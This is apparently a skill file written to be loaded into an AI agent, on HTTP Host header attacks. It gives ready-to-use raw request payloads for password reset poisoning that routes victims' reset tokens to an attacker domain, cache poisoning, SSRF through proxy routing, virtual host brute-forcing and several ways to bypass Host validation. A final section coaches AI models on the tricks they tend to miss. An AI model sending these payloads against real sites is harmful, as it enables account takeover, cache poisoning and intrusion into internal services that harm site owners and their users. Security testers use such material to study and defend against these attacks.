# SKILL: HTTP Host Header Attacks — Injection & Routing Abuse

> **AI LOAD INSTRUCTION**: Covers Host header injection for password reset poisoning, cache poisoning, SSRF via routing, and virtual host bypass. Includes bypass techniques for Host validation and framework-specific behaviors. Base models often miss the double-Host trick, absolute-URI override, and connection-state attacks.

## 1. ATTACK SURFACE

The Host header is used by web applications and infrastructure for:

| Usage | Exploitation |
|---|---|
| URL generation (password reset links, email links) | Inject attacker domain → user clicks link to attacker |
| Virtual host routing | Spoof Host → access internal/admin vhost |
| Cache key component | Inject different Host → poison cache for all users |
| Reverse proxy routing | Host determines backend → SSRF to internal services |
| Access control decisions | Host-based ACLs can be bypassed |
| Canonical URL / SEO redirects | Host injection → open redirect |

---

## 2. PASSWORD RESET POISONING

The most common and impactful Host header attack.

### How It Works

```
1. Attacker requests password reset for victim@target.com
2. Attacker modifies Host header in the reset request:
   POST /forgot-password HTTP/1.1
   Host: attacker.com    ← injected
   
   email=victim@target.com

3. Server generates reset link using Host header value:
   "Click here to reset: https://attacker.com/reset?token=SECRET_TOKEN"

4. Victim receives email, clicks link → token sent to attacker
5. Attacker uses token on real target.com to reset password
```

### Testing

```http
POST /forgot-password HTTP/1.1
Host: attacker-collaborator.burpcollaborator.net
Content-Type: application/x-www-form-urlencoded

email=victim@target.com
```

Check Burp Collaborator for incoming HTTP request with the reset token.

### Variants

- Some apps concatenate: `Host: target.com.attacker.com` → link becomes `https://target.com.attacker.com/reset?token=xxx`
- Some apps use only the port portion: `Host: target.com:@attacker.com` → parsed as `attacker.com` in some URL parsers

---

## 3. WEB CACHE POISONING VIA HOST

```
1. Attacker sends:
   GET / HTTP/1.1
   Host: attacker.com

2. If cache keys on URL path but NOT on Host header:
   → Response cached with attacker.com in generated links/content

3. Subsequent users requesting GET / receive the poisoned response
   → Links point to attacker.com, scripts load from attacker.com
```

**Key requirement**: Cache must not include Host header in cache key, but application must use Host in response body.

Test by sending two requests with different Host values and checking if the second request returns the first's Host in the response.

---

## 4. SSRF VIA HOST ROUTING

When a reverse proxy uses Host header to route to backends:

```
GET /api/internal HTTP/1.1
Host: internal-admin-panel.local

→ Reverse proxy routes request to internal-admin-panel.local
→ Attacker accesses internal service
```

Common in:
- Nginx `proxy_pass` based on `$host`
- Apache `ProxyPass` with virtual host routing
- Kubernetes Ingress controllers
- Cloud load balancers

---

## 5. VIRTUAL HOST BYPASS

Many servers host multiple applications on the same IP via virtual hosting:

```
Target:  Host: www.target.com  → public site
Hidden:  Host: admin.target.com → admin panel (not in public DNS)
Hidden:  Host: staging.target.com → staging environment
Hidden:  Host: localhost → server status page
```

### Discovery

```
1. Brute-force Host header with common vhost names:
   ffuf -u http://TARGET_IP -H "Host: FUZZ.target.com" -w vhosts.txt

2. Try special values:
   Host: localhost
   Host: 127.0.0.1
   Host: admin
   Host: internal
   Host: intranet

3. Compare response size/content to identify different vhosts
```

## 6. BYPASS TECHNIQUES WHEN HOST IS VALIDATED

### 6.1 Override Headers

Many frameworks/proxies trust these headers over the Host header:

| Header | Frameworks That Trust It |
|---|---|
| `X-Forwarded-Host` | Symfony, Laravel, Django (when `USE_X_FORWARDED_HOST=True`), Rails (behind proxy) |
| `X-Host` | Some custom proxy configurations |
| `X-Original-URL` | IIS with URL Rewrite module |
| `X-Rewrite-URL` | IIS with URL Rewrite module |
| `Forwarded: host=attacker.com` | RFC 7239 compliant proxies |
| `X-Forwarded-Server` | Apache mod_proxy |

Test all simultaneously:

```http
GET /forgot-password HTTP/1.1
Host: target.com
X-Forwarded-Host: attacker.com
X-Host: attacker.com
X-Original-URL: /forgot-password
Forwarded: host=attacker.com
```

### 6.2 Absolute URL in Request Line

```http
GET http://attacker.com/path HTTP/1.1
Host: target.com
```

Per HTTP/1.1 spec (RFC 7230): if the request line contains an absolute URI, the Host header SHOULD be ignored. Some servers follow this, some don't — the mismatch between proxy and backend creates the vulnerability.

### 6.3 Double Host Header

```http
GET /path HTTP/1.1
Host: target.com
Host: attacker.com
```

Behavior varies:
- Some proxies validate first Host, app uses second
- Some servers concatenate: `target.com, attacker.com`
- RFC says: if both differ, return 400. Most servers don't.

### 6.4 Host with Port / Credentials

```http
Host: target.com:@attacker.com
Host: target.com:evil.com
Host: target.com#@attacker.com
Host: attacker.com%23@target.com
```

URL parsers may extract the "host" portion differently when credentials (`@`) or fragments (`#`) are present.

### 6.5 Trailing Dot

```http
Host: target.com.
```

DNS treats `target.com.` and `target.com` identically (trailing dot = FQDN). But Host validation may not strip the trailing dot → `target.com. ≠ target.com` in string comparison → bypass whitelist.

### 6.6 Tab / Space Injection

```http
Host: target.com\tattacker.com
Host: target.com attacker.com
```

Some parsers split on whitespace; the server may use `attacker.com` portion while validation checks `target.com` portion.

### 6.7 Wrap-Around / Enclosed Values

```http
Host: "attacker.com"
Host: <attacker.com>
```

Quoted or bracketed values may be stripped by the app but not by the validator.

## 7. FRAMEWORK-SPECIFIC BEHAVIOR

| Framework | Host Source | Gotcha |
|---|---|---|
| **PHP** | `$_SERVER['HTTP_HOST']` (raw header, directly injectable) | `SERVER_NAME` is safer only with `UseCanonicalName On` |
| **Django** | `HttpRequest.get_host()` checks X-Forwarded-Host first (if enabled) | `USE_X_FORWARDED_HOST=True` bypasses `ALLOWED_HOSTS` |
| **Rails** | `request.host` from Host header; trusts `X-Forwarded-Host` behind proxy | Rails 6+ `HostAuthorization` middleware mitigates |
| **Node/Express** | `req.hostname` / `req.headers.host`; with `trust proxy` uses X-Forwarded-Host | No built-in host validation |

---

## 8. CONNECTION-STATE ATTACKS

A sophisticated variant exploiting HTTP keep-alive:

```
Connection 1:
  Request 1: GET / HTTP/1.1    ← Valid Host: target.com
              Host: target.com     → Proxy validates, forwards, keeps connection open

  Request 2: GET /admin HTTP/1.1  ← Evil Host on SAME connection
              Host: evil.com       → Some proxies skip validation on subsequent requests
                                     (they validated the connection on first request)
```

This works against proxies that perform Host validation only on the first request of a keep-alive connection.

### Testing

```
1. Use Burp Repeater with "Connection: keep-alive"
2. Send normal request first
3. On same connection, send request with manipulated Host
4. Check if second request is processed differently
```

## 10. TRICK NOTES — WHAT AI MODELS MISS

1. **Password reset poisoning doesn't require the victim to be logged in** — you request the reset, the victim just clicks the link. The token lands on your server.
2. **X-Forwarded-Host is the #1 missed bypass**: Most Host validation checks `Host` header but frameworks silently prefer `X-Forwarded-Host` when behind a proxy.
3. **Double Host header is protocol-valid but behavior-undefined**: RFC says reject with 400, but almost no server actually does this. The mismatch between proxy and app is the vulnerability.
4. **Absolute URI overrides Host per RFC**: `GET http://evil.com/path HTTP/1.1\nHost: target.com` — the spec says use the request-line URI. But not all implementations agree.
5. **Cache poisoning via Host requires the cache to exclude Host from the key**: Most CDNs include Host in the cache key. But custom Varnish/Nginx caches may not. Also test with `X-Forwarded-Host` as cache key differentiator.
6. **Connection-state attacks are rarely tested**: Automated scanners don't test keep-alive behavior. Manual testing via Burp Repeater's connection reuse is essential.
7. **DNS rebinding + Host attacks**: If you control DNS, point your domain to the target's IP → your domain resolves to their server → Host header says your domain, but request hits their server. Useful for bypassing IP-based access controls.
